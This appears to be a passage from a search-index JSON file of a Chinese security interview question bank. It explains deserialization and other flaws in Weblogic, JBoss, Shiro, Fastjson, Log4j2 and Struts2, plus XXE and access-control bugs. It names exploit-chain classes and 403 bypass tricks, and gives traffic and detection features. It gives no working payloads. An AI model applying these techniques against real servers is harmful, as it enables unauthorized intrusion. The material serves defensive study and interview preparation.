</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#weblogic","title":"Weblogic(\u4e86\u6770\u514b)\u53cd\u5e8f\u5217\u5316","text":"<p>\u5e38\u5f00\u653e\u4e8e7001/7002\u7aef\u53e3</p> <p>Weblogic\uff08\u53ca\u5176\u4ed6\u5f88\u591ajava\u670d\u52a1\u5668\u5e94\u7528\uff09\u5728\u901a\u4fe1\u8fc7\u7a0b\u4e2d\u4f20\u8f93\u6570\u636e\u5bf9\u8c61\uff0c\u6d89\u53ca\u5230\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u64cd </p> <p>\u4f5c\uff0c\u5982\u679c\u80fd\u627e\u5230\u67d0\u4e2a\u7c7b\u5728\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u80fd\u6267\u884c\u67d0\u4e9b\u5947\u602a\u7684\u4ee3\u7801\uff0c\u5c31\u6709\u53ef\u80fd\u901a\u8fc7\u63a7\u5236\u8fd9\u4e9b\u4ee3\u7801\u8fbe\u5230RCE </p> <p>\u7684\u6548\u679c </p> <p>\u2022 \u5e38\u89c1\u7684weblogic\u6f0f\u6d1e </p> <p>\\1. #CVE-2016-0638 </p> <p>Weblogic \u76f4\u63a5\u53cd\u5e8f\u5217\u5316 </p> <p>\u57fa\u4e8eWeblogic t3\u534f\u8bae\u5f15\u8d77\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e </p> <p>\u6f0f\u6d1e\u5b9e\u4e3aCVE-2015-4852\u7ed5\u8fc7 </p> <p>\u62dcOracle\u4e00\u76f4\u4ee5\u6765\u7684\u9ed1\u540d\u5355\u4fee\u590d\u65b9\u5f0f\u6240\u8d50 </p> <p>\\2. #CVE-2016-3510 </p> <p>\u57fa\u4e8eWeblogic t3\u534f\u8bae\u5f15\u8d77\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e </p> <p>\\3. #CVE-2017-3248 </p> <p>\u57fa\u4e8eWeblogic t3\u534f\u8bae\u5f15\u8d77\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e </p> <p>\u5c5e\u4e8eWeblogic JRMP\u53cd\u5e8f\u5217\u5316 </p> <p>\\4. #CVE-2018-2628 </p> <p>\u57fa\u4e8eWeblogic t3\u534f\u8bae\u5f15\u8d77\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e </p> <p>\u5c5e\u4e8e Weblogic JRMP\u53cd\u5e8f\u5217\u5316 </p> <p>\\5. #CVE-2018-2893 </p> <p>\u57fa\u4e8eWeblogic t3\u534f\u8bae\u5f15\u8d77\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e </p> <p>\u5b9e\u4e3aCVE-2018-2628\u7ed5\u8fc7 </p> <p>\u540c\u6837\u62dcOracle\u4e00\u76f4\u4ee5\u6765\u7684\u9ed1\u540d\u5355\u4fee\u590d\u65b9\u5f0f\u6240\u8d50 </p> <p>\u5c5e\u4e8eWeblogic JRMP\u53cd\u5e8f\u5217\u5316 </p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#weblogic_1","title":"weblogic\u6743\u9650\u7ed5\u8fc7","text":""},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#cve-2020-14882","title":"CVE-2020-14882\uff1a","text":"<p>\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u6784\u9020\u7279\u6b8a\u7684HTTP\u8bf7\u6c42\uff0c\u5728\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u60c5\u51b5\u4e0b\u63a5\u7ba1 WebLogic \u7ba1\u7406\u63a7\u5236\u53f0\u3002 </p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u6784\u9020\u7279\u6b8a\u8bf7\u6c42\u7684URL\uff0c\u5373\u53ef\u672a\u6388\u6743\u8bbf\u95ee\u5230\u7ba1\u7406\u540e\u53f0\u9875\u9762\uff0c\u8bbf\u95ee\u540e\u53f0\u540e\u662f\u4e00\u4e2a\u4f4e\u6743\u9650\u7684\u7528 </p> <p>\u6237\uff0c\u65e0\u6cd5\u5b89\u88c5\u5e94\u7528\uff0c \u4e5f\u65e0\u6cd5\u76f4\u63a5\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 </p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#cve-2020-14883","title":"CVE-2020-14883\uff1a","text":"<p>\u5141\u8bb8\u540e\u53f0\u4efb\u610f\u7528\u6237\u901a\u8fc7HTTP\u534f\u8bae\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\u4f7f\u7528\u8fd9\u4e24\u4e2a\u6f0f\u6d1e\u7ec4\u6210\u7684\u5229\u7528\u94fe\uff0c\u53ef\u901a\u8fc7\u4e00\u4e2aHTTP </p> <p>\u8bf7\u6c42\u5728\u8fdc\u7a0bWeblogic </p> <p>\u670d\u52a1\u5668\u4e0a\u4ee5\u672a\u6388\u6743\u7684\u4efb\u610f\u7528\u6237\u8eab\u4efd\u6267\u884c\u547d\u4ee4\u3002 </p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_11","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u7b2c\u4e00\u79cd\u65b9\u6cd5\u662f\u901a\u8fc7com.tangosol.coherence.mvel2.sh.ShellSession </p> <p>\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u662f\u901a\u8fc7 </p> <p>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplic </p> <p>ationContext</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#104-","title":"104-\u5e38\u89c1\u7684\u4e2d\u95f4\u4ef6\u53ca\u6f0f\u6d1e","text":"<p>\\1. Tomcat\uff08\u6c64\u59c6\u5361\u7279\uff09 \u7aef\u53e38080 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c war\u540e\u95e8\u6587\u4ef6\u90e8\u7f72 </p> <p>\\2. WebLogic\uff08WEB\u4e86\u6770\u514b\uff09 \u7aef\u53e3 7001 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 war\u540e\u95e8\u6587\u4ef6\u90e8\u7f72 </p> <p>\\3. Apache(\u963f\u5e15\u5947) \u7aef\u53e3\u53f7 80 \u89e3\u6790\u6f0f\u6d1e \u76ee\u5f55\u904d\u5386 </p> <p>\\4. Nginx \uff08\u55ef\u6025\u80af\u6b7b\uff09\u6587\u4ef6\u89e3\u6790 \u76ee\u5f55\u904d\u5386 \u76ee\u5f55\u7a7f\u8d8a </p> <p>\\5. jBoss \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u672a\u6388\u6743\u8bbf\u95ee </p> <p>\\6. iiS \u89e3\u6790\u6f0f\u6d1e \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#jbossboss","title":"Jboss(\u8863BOSS) \u53cd\u5e8f\u5217\u5316","text":"<p>jboss\u7684\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u51fa\u73b0\u5728jboss\\server\\all\\deploy\\httpha- </p> <p>invoker.sar\\invoker.war\\WEB-INF\\classes\\org\\jboss\\invocation\\http\\servlet\uff08\u8272\u4e0d\u4e86\u7279\uff09\u76ee\u5f55 </p> <p>\u4e0b\u7684ReadOnlyAccessFilter.class\u6587\u4ef6\u4e2d\u7684doFilter\uff08\u90fd\u975et\uff09\u4e2d\u3002 </p> <p>\u7a0b\u5e8f\u83b7\u53d6http\u6570\u636e\u4fdd\u5b58\u5230\u4e86httpRequest(\u745e\u5feb\u6b7b)\u4e2d\uff0c\u5e8f\u5217\u5316\u540e\u4fdd\u5b58\u5230\u4e86ois\u4e2d\uff0c\u7136\u540e\u6ca1\u6709\u8fdb\u884c\u8fc7\u6ee4\u64cd\u4f5c\uff0c\u76f4\u63a5 </p> <p>\u4f7f\u7528\u4e86readObject\uff08\uff09\u8fdb\u884c\u4e86\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\u4fdd\u5b58\u5230\u4e86mi\u53d8\u91cf\u4e2d\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u5178\u578b\u7684java\u53cd\u5e8f\u5217\u5316 </p> <p>\u6f0f\u6d1e\u3002</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#shrio","title":"Shrio\uff08\u7ec6\u8089\uff09\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u539f\u7406","text":""},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#shrio550","title":"shrio550\u7684\u539f\u7406","text":"<p>Apache Shiro\u6846\u67b6\u63d0\u4f9b\u4e86\u8bb0\u4f4f\u5bc6\u7801\u7684\u529f\u80fd\uff08RememberMe\uff09\uff0c\u7528\u6237\u767b\u5f55\u6210\u529f\u540e\u4f1a\u751f\u6210\u7ecf\u8fc7\u52a0\u5bc6\u5e76 </p> <p>\u7f16\u7801\u7684cookie\u3002\u5728\u670d\u52a1 </p> <p>\u7aef\u5bf9rememberMe\uff08\u8bb0\u4f4f\u5bc6\u7801\uff09\u7684cookie\u503c\uff0c\u5148base64\u89e3\u7801\u7136\u540eAES\u89e3\u5bc6\u518d\u53cd\u5e8f\u5217\u5316\uff0c\u5c31\u5bfc\u81f4\u4e86\u53cd\u5e8f\u5217\u5316RCE\u6f0f </p> <p>\u6d1e\u3002 </p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#payload","title":"payload\u4ea7\u751f\u8fc7\u7a0b","text":"<p>\u547d\u4ee4=&gt;\u5e8f\u5217\u5316=&gt;AES\u52a0\u5bc6=&gt;base64\u7f16\u7801=&gt;RememberMe(\u8bb0\u4f4f\u5bc6\u7801) Cookie\u503c </p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#shrio721","title":"shrio721\u539f\u7406","text":"<p>\u7531\u4e8eApache Shiro cookie\u4e2d\u901a\u8fc7 AES-128-CBC \u6a21\u5f0f\u52a0\u5bc6\u7684rememberMe\u5b57\u6bb5\u5b58\u5728\u95ee\u9898\uff0c\u7528 </p> <p>\u6237\u53ef\u901a\u8fc7Padding Oracle </p> <p>\u52a0\u5bc6\u751f\u6210\u7684\u653b\u51fb\u4ee3\u7801\u6765\u6784\u9020\u6076\u610f\u7684rememberMe\u5b57\u6bb5\uff0c\u5e76\u91cd\u65b0\u8bf7\u6c42\u7f51\u7ad9\uff0c\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u653b\u51fb\uff0c\u6700\u7ec8 </p> <p>\u5bfc\u81f4\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002</p> <p>cookie\u5b57\u6bb5\u4f7f\u7528\u9ed8\u8ba4key\u89e3\u5bc6\u540e\uff0c\u53cd\u5e8f\u5217\u5316\u6570\u636e\u4e2d\u52a0\u5165 \u6076\u610fpayload</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#shiro","title":"\u5e73\u5e38\u600e\u4e48\u53bb\u53d1\u73b0shiro\u6f0f\u6d1e\u7684","text":"<p>\u7b54\uff1a\u767b\u9646\u5931\u8d25\u65f6\u5019\u4f1a\u8fd4\u56derememberMe=deleteMe\u5b57\u6bb5\u6216\u8005\u4f7f\u7528shiroScan\uff08\u7ec6\u8089\u6b7b\u5e72\uff09\u88ab\u52a8\u626b\u63cf\u53bb\u53d1\u73b0\u3002</p> <p>\u5b8c\u6574\uff1a</p> <p>\u672a\u767b\u9646\u7684\u60c5\u51b5\u4e0b\uff0c\u8bf7\u6c42\u5305\u7684cookie\u4e2d\u6ca1\u6709rememberMe\u5b57\u6bb5\uff0c\u8fd4\u56de\u5305set-Cookie\u91cc\u4e5f\u6ca1\u6709deleteMe\u5b57\u6bb5</p> <p>\u767b\u9646\u5931\u8d25\u7684\u8bdd\uff0c\u4e0d\u7ba1\u52fe\u9009RememberMe\u5b57\u6bb5\u6ca1\u6709\uff0c\u8fd4\u56de\u5305\u90fd\u4f1a\u6709rememberMe=deleteMe\u5b57\u6bb5</p> <p>\u4e0d\u52fe\u9009RememberMe\u5b57\u6bb5\uff0c\u767b\u9646\u6210\u529f\u7684\u8bdd\uff0c\u8fd4\u56de\u5305set-Cookie\u4f1a\u6709rememberMe=deleteMe\u5b57\u6bb5\u3002\u4f46\u662f\u4e4b\u540e\u7684\u6240\u6709\u8bf7\u6c42\u4e2dCookie\u90fd\u4e0d\u4f1a\u6709rememberMe\u5b57\u6bb5</p> <p>\u52fe\u9009RememberMe\u5b57\u6bb5\uff0c\u767b\u9646\u6210\u529f\u7684\u8bdd\uff0c\u8fd4\u56de\u5305set-Cookie\u4f1a\u6709rememberMe=deleteMe\u5b57\u6bb5\uff0c\u8fd8\u4f1a\u6709rememberMe\u5b57\u6bb5\uff0c\u4e4b\u540e\u7684\u6240\u6709\u8bf7\u6c42\u4e2dCookie\u90fd\u4f1a\u6709rememberMe\u5b57\u6bb5</p> <p>\u95ee\uff1ashiro\u6709\u51e0\u79cd\u6f0f\u6d1e\u7c7b\u578b</p> <p>\u7b54\uff1ashiro 550</p> <p>shiro 721</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#shiro-550-shiro-721","title":"Shiro 550 shiro 721 \u6f0f\u6d1e\u533a\u522b","text":"<p>Shiro-550\uff08&lt;1.2.4\u7248\u672c\uff09\uff08AES\u52a0\u5bc6\uff09\u4e0d\u9700\u8981\u6709\u6548\u7684\u7528\u6237cookie\uff0c\u53ea\u8981\u904d\u5386\u5230\u6b63\u786e\u7684key\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\uff08\u6f0f\u6d1e\u4ea7\u751f\u5c31\u662f\u56e0\u4e3a\u9ed8\u8ba4key\uff09</p> <p>Shiro-721\uff08&lt;1.4.2\u7248\u672c\uff09 \uff08AES-128-CBC \u6a21\u5f0f\u52a0\u5bc6\uff09\u6761\u4ef6\u53d7\u9650\uff0c\u9700\u8981\u4e00\u4e2a\u5df2\u7ecf\u767b\u5f55/\u5408\u6cd5\u7684\u7528\u6237cookie\uff0c\u8fdb\u884cPadding Oracle\u586b\u5145\u653b\u51fb\u6784\u9020\u6076\u610f\u7684\u53cd\u5e8f\u5217\u5316\u3002</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#shiro_1","title":"\u5982\u4f55\u8fa8\u522bshiro\u662f\u5426\u5229\u7528\u6210\u529f\uff1f","text":"<ol> <li>\u5927\u90e8\u5206shiro\u5b58\u5728\u56de\u663e\uff0c\u54cd\u5e94\u5305\u5b58\u5728\u56de\u663e\u6d88\u606f\uff0c\u4e5f\u53ef\u80fd\u4e0d\u56de\u663e\u6216\u8005\u76f4\u63a5\u53cd\u5f39shell</li> <li>\u4e0e\u8bbe\u5907\u8fd0\u7ef4\u4eba\u5458\u786e\u8ba4\u662f\u5426\u4f7f\u7528\u9ed8\u8ba4Key\uff0cshiro\u7248\u672c\u7b49\uff0c\u5982\u679c\u4f7f\u7528\u9ed8\u8ba4key\uff0c\u4f7f\u7528key\u5bf9\u7591\u4f3c\u653b\u51fb\u8bf7\u6c42\u5305\u8fdb\u884c\u89e3\u5bc6\u7814\u5224\u3002</li> </ol>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#shrio550_1","title":"shrio550\u7684\u7279\u5f81","text":"<p>\u8fd4\u56de\u5305\u4e2d\u5305\u542brememberMe=deleteMe\u5b57\u6bb5\u3002</p> <p>Shiro-550\uff08&lt;1.2.4\u7248\u672c\uff09\uff08AES\u52a0\u5bc6\uff09\u4e0d\u9700\u8981\u6709\u6548\u7684\u7528\u6237cookie\uff0c\u53ea\u8981\u904d\u5386\u5230\u6b63\u786e\u7684key\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\uff08\u6f0f\u6d1e\u4ea7\u751f\u5c31\u662f\u56e0\u4e3a\u9ed8\u8ba4key\uff09</p> <p>Shiro-721\uff08&lt;1.4.2\u7248\u672c\uff09 \uff08AES-128-CBC \u6a21\u5f0f\u52a0\u5bc6\uff09\u6761\u4ef6\u53d7\u9650\uff0c\u9700\u8981\u4e00\u4e2a\u5df2\u7ecf\u767b\u5f55/\u5408\u6cd5\u7684\u7528\u6237cookie\uff0c\u8fdb\u884cPadding Oracle\u586b\u5145\u653b\u51fb\u6784\u9020\u6076\u610f\u7684\u53cd\u5e8f\u5217\u5316\u3002</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#fastjson","title":"\u95ee\uff1afastjson(\u6cd5\u6b7b\u7279\u6770\u6811)\u6f0f\u6d1e\u5229\u7528\u539f\u7406","text":"<p>\u56de\u7b54\uff1a\u5728\u8bf7\u6c42\u5305\u91cc\u9762\u4e2d\u53d1\u9001\u6076\u610f\u7684json\uff08\u6770\u6811\uff09\u683c\u5f0fpayload\uff08\u966a\u697c\uff09\uff0c\u6f0f\u6d1e\u5728\u5904\u7406json\u5bf9\u8c61\u7684\u65f6\u5019\uff0c\u6ca1\u6709\u5bf9@type\uff08\u592a\u666e\uff09\u5b57\u6bb5\u8fdb\u884c\u8fc7\u6ee4\uff0c\u4ece\u800c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u4f20\u5165\u6076\u610f\u7684TemplatesImpl(\u6a21\u677f)\u7c7b\uff0c\u800c\u8fd9\u4e2a\u7c7b\u6709\u4e00\u4e2a\u5b57\u6bb5\u5c31\u662f_bytecodes\uff08\u62dc\u6263\u74f7\uff09\uff0c\u6709\u90e8\u5206\u51fd\u6570\u4f1a\u6839\u636e\u8fd9\u4e2a_bytecodes\u751f\u6210java\u5b9e\u4f8b\uff0c\u8fd9\u5c31\u8fbe\u5230fastjson\u901a\u8fc7\u5b57\u6bb5\u4f20\u5165\u4e00\u4e2a\u7c7b\uff0c\u518d\u901a\u8fc7\u8fd9\u4e2a\u7c7b\u88ab\u751f\u6210\u65f6\u6267\u884c\u6784\u9020\u51fd\u6570\u3002</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#fastjson_1","title":"fastjson\u4e0d\u51fa\u7f51\u5229\u7528","text":"<p>\u662f\u963f\u91cc\u5df4\u5df4\u7684\u5f00\u6e90JSON\u89e3\u6790\u5e93\uff0c\u662f\u4e00\u4e2a Java \u5e93,\u53ef\u4ee5\u5c06 Java \u5bf9\u8c61\u8f6c\u6362\u4e3a JSON \u683c\u5f0f,\u5f53\u7136\u5b83\u4e5f\u53ef\u4ee5\u5c06 JSON \u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a Java \u5bf9\u8c61</p> <p>1.\u5199\u6587\u4ef6\u5229\u7528\u94fe\uff0cwebshell</p> <p>2.\u53bb\u6784\u9020\u4e00\u4e2a\u56de\u663e</p> <p>3.\u53bb\u6784\u9020\u4e00\u4e2a\u65f6\u95f4\u76f2\u6ce8 \u62a5\u8def\u5f84</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#log4j2","title":"Log4j2\u6f0f\u6d1e\u539f\u7406","text":"<p>Log4j2 \u4e2d\u63d0\u4f9b\u4e86Lookups\uff08\u52d2\u5361\u4e0d\u6b7b\uff09 \u673a\u5236\uff0c\u7528\u4e8e\u6dfb\u52a0\u4e00\u4e9b\u7279\u6b8a\u503c\u5230\u65e5\u5fd7\u4e2d\uff0c\u5728 Lookups \u673a\u5236\u4e2d\uff0c\u7531\u4e8e JNDI \u529f\u80fd\u6ca1\u6709\u5bf9\u540d\u79f0\u89e3\u6790\u505a\u9650\u5236\uff0c\u800c\u67d0\u4e9b\u534f\u8bae\u662f\u4e0d\u5b89\u5168\u7684\uff0c\u53ef\u4ee5\u5141\u8bb8\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u4ece\u800c\u5bfc\u81f4RCE\u6f0f\u6d1e\u3002</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#log4j2_1","title":"log4j2\u6d41\u91cf\u7279\u5f81","text":"<p>\u61c2\u5f97\u90fd\u61c2</p> <p>${}</p> <p>Ldap</p> <p>Ip</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#struts2ss","title":"Struts2(S\u649eS\u571f)\u91cf\u7279\u5f81","text":"<p>1.GET\uff0cPOST\uff0ccontent-type</p> <p>2.*.action\u6587\u4ef6/*.jsp\u6587\u4ef6</p> <p>3.JAVA\u5f00\u53d1</p> <p>4.OGNL\u8868\u8fbe\u5f0f\u6ce8\u5165</p> <p>\\5. %</p> <p>6.%{</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#log4j2_2","title":"\u5982\u4f55\u5224\u65adlog4j2\u662f\u5426\u5229\u7528\u6210\u529f\uff1f","text":"<ol> <li>\u914d\u5408ids\u4e3b\u673a\u9632\u5fa1\u7cfb\u7edf\uff0c\u67e5\u770b\u76ee\u6807\u4e3b\u673a\u662f\u5426\u5b58\u5728\u5916\u5e26\u653b\u51fb</li> <li>\u67e5\u770b\u6d41\u91cf\u6001\u52bf\uff0c\u76ee\u6807\u4e3b\u673a\u662f\u5426\u5b58\u5728 dnslog\u6d3b\u52a8</li> <li>\u4e0b\u8f7d\u76ee\u6807\u6076\u610f\u7c7b\uff0c\u67e5\u770b\u76ee\u6807\u6076\u610f\u7c7b\u6267\u884c\u4ec0\u4e48\u5185\u5bb9</li> </ol> <p>\u4eba\u5458\u56de\u7b54</p> <ol> <li>\u51fa\u7f51\u4e00\u822c\u8d70 rmi ldap</li> </ol>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#cookie","title":"Cookie\u5b57\u6bb5\u4f60\u4f1a\u6d4b\u8bd5\u4ec0\u4e48\u5185\u5bb9\uff1f","text":"<p>sql\u6ce8\u5165</p> <p>\u8d8a\u6743</p> <p>Log4j2</p> <p>shiro</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#403","title":"403/\u8bbf\u95ee/\u76ee\u5f55/\u7a81\u7834","text":"<p>1.\u4fee\u6539host(\u540e\u6b7b\u7279)</p> <p>2.\u6269\u5c55\u540d\u7ed5\u8fc7</p> <p>3.\u8986\u76d6\u8bf7\u6c42url</p> <p>4.Referer \u6807\u5934</p> <p>5.fuzz\u4e0b\u7ea7\u76ee\u5f55</p> <p>\u903b\u8f91\u6f0f\u6d1e</p> <p>\u8eab\u4efd\u9a8c\u8bc1\u6f0f\u6d1e </p> <p>\u6743\u9650\u7c7b\u903b\u8f91\u6f0f\u6d1e\uff08\u6c34\u5e73\uff0c\u5782\u76f4\uff0c\u672a\u6388\u6743\uff09 </p> <p>\u56fe\u5f62\u9a8c\u8bc1\u7801\u6f0f\u6d1e </p> <p>\u627e\u56de\u5bc6\u7801\u903b\u8f91\u6f0f\u6d1e </p> <p>\u4e1a\u52a1\u6570\u636e\u7be1\u6539\u6f0f\u6d1e</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_12","title":"\u652f\u4ed8\u6f0f\u6d1e\u7406\u89e3","text":"<p>\u540e\u7aef\u4e0e\u524d\u7aef\u68c0\u9a8c\u4e0d\u4e25\u8c28\uff0c\u7f3a\u4e4f\u591a\u91cd\u6821\u9a8c</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_13","title":"\u8d8a\u6743/\u5206\u7c7b","text":"<p>\u5782\u76f4\uff0c\u6c34\u5e73\uff08\u4e24\u8005\u533a\u522b\u662f\u4ec0\u4e48\uff09</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_14","title":"\u8d8a\u6743/\u539f\u7406","text":"<p>\u7f3a\u4e4f\u5bf9\u7528\u6237\u8eab\u4efd\u7684\u4e25\u683c\u6821\u9a8c\uff0c\u5b58\u5728\u7f3a\u9677\u7684\u9a8c\u8bc1\u673a\u5236</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#_15","title":"\u903b\u8f91\u8d8a\u6743\u548c\u6c34\u5e73\u8d8a\u6743\u7684\u533a\u522b\uff1a","text":"<p>\u6c34\u5e73\u8d8a\u6743\uff1a\u7528\u6237\u5728\u6743\u9650\u76f8\u540c\u7ea7\u522b\u4e0b\u7684\u7ec4\uff0c\u53ef\u4ee5\u8fdb\u884c\u8d8a\u6743\u8bbf\u95ee\u3001\u4fee\u6539\u3001\u5220\u9664\u6570\u636e</p> <p>\u903b\u8f91\u8d8a\u6743\uff1a\u7528\u6237\u53ef\u4ee5\u5728\u4e0d\u540c\u6743\u9650\u7684\u7ec4\u4e0b\uff0c\u8fdb\u884c\u9ad8\u7ea7\u522b\u7684\u6743\u9650\u8bbf\u95ee</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#java","title":"JAVA\u53cd\u5e8f\u5217\u5316","text":"<p>Java\u5e8f\u5217\u5316\u662f\u6307\u628aJava\u5bf9\u8c61\u8f6c\u6362\u4e3a\u5b57\u8282\u5e8f\u5217\u7684\u8fc7\u7a0b\uff1b</p> <p>Java\u53cd\u5e8f\u5217\u5316\u662f\u6307\u628a\u5b57\u8282\u5e8f\u5217\u6062\u590d\u4e3aJava\u5bf9\u8c61\u7684\u8fc7\u7a0b\uff1b</p> <p>Java\u5e94\u7528\u5bf9\u7528\u6237\u8f93\u5165\uff0c\u5373\u4e0d\u53ef\u4fe1\u6570\u636e\u505a\u4e86\u53cd\u5e8f\u5217\u5316\u5904\u7406\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6784\u9020\u6076\u610f\u8f93\u5165\uff0c\u8ba9\u53cd\u5e8f\u5217\u5316\u4ea7\u751f\u975e\u9884\u671f\u7684\u5bf9\u8c61\uff0c\u975e\u9884\u671f\u7684\u5bf9\u8c61\u5728\u4ea7\u751f\u8fc7\u7a0b\u4e2d\u5c31\u6709\u53ef\u80fd\u5e26\u6765\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002</p> <p>JAVA Java \u5e8f\u5217\u5316\u662f\u6307\u628a Java \u5bf9\u8c61\u8f6c\u6362\u4e3a\u5b57\u8282\u5e8f\u5217\u7684\u8fc7\u7a0b\u4fbf\u4e8e\u4fdd\u5b58\u5728\u5185\u5b58\u3001\u2f42\u4ef6\u3001\u6570\u636e\u5e93\u4e2d\uff0cObjectOutputStream\uff08\u5bf9\u8c61\u8f93\u51fa\u6d41\uff09 \u7c7b\u7684 \uff08\u745e\u7684\u6770\u514b\uff09writeObject() \u2f45\u6cd5\u53ef\u4ee5\u5b9e\u73b0\u5e8f\u5217\u5316\u3002Java \u53cd\u5e8f\u5217\u5316\u662f\u6307\u628a\u5b57\u8282\u5e8f\u5217\u6062\u590d\u4e3a Java \u5bf9\u8c61\u7684\u8fc7\u7a0b\uff0cObjectInputStream \u7c7b\u7684 readObject() \u2f45\u6cd5\u2f64\u4e8e\u53cd\u5e8f\u5217\u5316\u3002</p>"},{"location":"HW%E9%9D%A2%E8%AF%95/%E9%A2%98%E5%BA%93/#xxexml","title":"Xxe\u539f\u7406\uff08xml\u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\uff09","text":"<p>\u5c31\u662f\u670d\u52a1\u5668\u5f00\u542f\u4e86xml\u4f20\u8f93\u7684\u51fd\u6570\uff0c\u5728POST\u8868\u5355\u9875\u9762\u53ef\u4ee5\u6784\u9020playload\u8fdb\u884c\u7ed5 </p> <p>\u8fc7\uff0c\u8fdb\u800c\u9020\u6210\u547d\u4ee4\u6267\u884c\uff0c\u6e90\u7801\u8bfb\u53d6\uff0c\u6587\u4ef6\u4fe1\u606f\u6cc4\u9732\u7b49\u3002</p> <p>XML\u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\uff0c\u5728\u5e94\u7528\u7a0b\u5e8f\u89e3\u6790XML\u8f93\u5165\u65f6\uff0c\u5f53\u5141\u8bb8\u5f15\u7528\u5916\u90e8\u5b9e\u4f53\u65f6\uff0c\u53ef\u6784\u9020\u6076\u610f\u5185\u5bb9\uff0c\u4ea7\u751f\u6f0f\u6d1e\u3002</p> <p>\u670d\u52a1\u7aef\u89e3\u6790\u7528\u6237\u63d0\u4ea4\u7684XML\u6587\u4ef6\u65f6\uff0c\u672a\u5bf9XML\u6587\u4ef6\u5f15\u7528\u7684\u5916\u90e8\u5b9e\u4f53\uff08\u542b\u5916\u90e8\u4e00\u822c\u5b9e\u4f53\u548c\u5916\u90e8\u53c2\u6570\u5b9e\u4f53\uff09\u505a\u5408\u9002\u7684\u5904\u7406\uff0c\u5e76\u4e14\u5b9e\u4f53\u7684URL\u652f\u6301 file:// \u548c ftp:// \u7b49\u534f\u8bae\uff0c\u5bfc\u81f4\u53ef\u52a0\u8f7d\u6076\u610f\u5916\u90e8\u6587\u4ef6 \u548c 